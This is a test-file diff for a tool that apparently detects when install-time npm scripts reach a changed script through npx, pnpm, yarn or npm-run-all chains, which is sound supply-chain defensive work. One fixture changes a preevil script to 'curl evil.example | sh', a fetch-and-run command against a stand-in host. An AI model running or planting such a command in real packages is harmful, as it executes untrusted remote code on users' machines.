@@ -152,3 +152,41 @@ describe("review round two", () => {
     for (const hook of ["npx --prefix=sub run-s evil", "npx --prefix sub run-s evil", "npx -C sub run-s evil"]) expect(bodyHeld(`if true; then ${hook}; fi`), hook).toBe(false);
   });
 });
+
+// A script first reached with pre and post scripts off (`npm run --ignore-scripts other2`, whose runner reaches evil) is read
+// again when a later run reaches it with them on: `npm run evil` runs preevil, so a change to preevil holds.
+describe("a script reached first with hooks off is read again with hooks on", () => {
+  const scripts = (hook: string, other2: string, preevil: string) => pkg({ postinstall: hook, other2, evil: "echo a", preevil });
+  const preHeld = (hook: string, other2: string) =>
+    holds(scripts(hook, other2, "echo p"), scripts(hook, other2, "curl evil.example | sh")).length > 0;
+  const flagged = "npm run --ignore-scripts other2; npm run evil";
+  for (const inner of ["npx run-s evil", "pnpm exec run-s evil", "yarn run-s evil", "bunx run-s evil", "if true; then npx run-s evil; fi"]) {
+    test(`held where the follow lost main's hold: other2 = ${inner}`, () => expect(preHeld(flagged, inner)).toBe(true));
+  }
+  test("held where the follow lost main's hold: npm_config_ignore_scripts=true npm run other2 with pnpm dlx run-s", () => {
+    expect(preHeld("npm_config_ignore_scripts=true npm run other2; npm run evil", "pnpm dlx run-s evil")).toBe(true);
+  });
+  test("held where main missed it: other2 = npm run evil", () => expect(preHeld(flagged, "npm run evil")).toBe(true));
+  test("quiet when every run of evil has hooks off", () => {
+    expect(preHeld("npm run --ignore-scripts other2; npm run --ignore-scripts evil", "npx run-s evil")).toBe(false);
+  });
+});
+
+// npm-run-all splits a name from its arguments at the first space and runs that script with the rest.
+describe("a run-s name with arguments runs the script before the first space", () => {
+  for (const hook of ['npm-run-all --parallel a "evil -- --flag"', 'npx run-s "evil -- --flag"', 'pnpm exec run-s "evil -- --flag"', "run-s 'evil --flag' quiet"]) {
+    test(`held where main missed it: ${hook}`, () => expect(bodyHeld(hook)).toBe(true));
+  }
+  test("held where main missed it: a name after a name with arguments is still read", () => expect(bodyHeld('if true; then run-s "quiet --x" evil; fi')).toBe(true));
+  test("a change to another script is quiet", () => expect(otherHeld('npx run-s "evil -- --flag"')).toBe(false));
+});
+
+// npm-run-all reads -pcl as -p -c -l and any --name=value as a config value (--npm-path=x too, only a separate --npm-path
+// word names npm), and the run goes on. -l=1 is an invalid option: nothing runs.
+describe("run-s flags npm-run-all reads as switches or config values", () => {
+  for (const flag of ["-pcl", "--race=x", "--max-parallel=2", "--npm-path=./x", "--p:k=v"]) {
+    const hook = `if true; then npx run-s ${flag} evil; fi`;
+    test(`held where main missed it: ${hook}`, () => expect(bodyHeld(hook)).toBe(true));
+  }
+  test("an invalid option runs nothing: not followed", () => expect(bodyHeld("if true; then npx run-s -l=1 evil; fi")).toBe(false));
+});
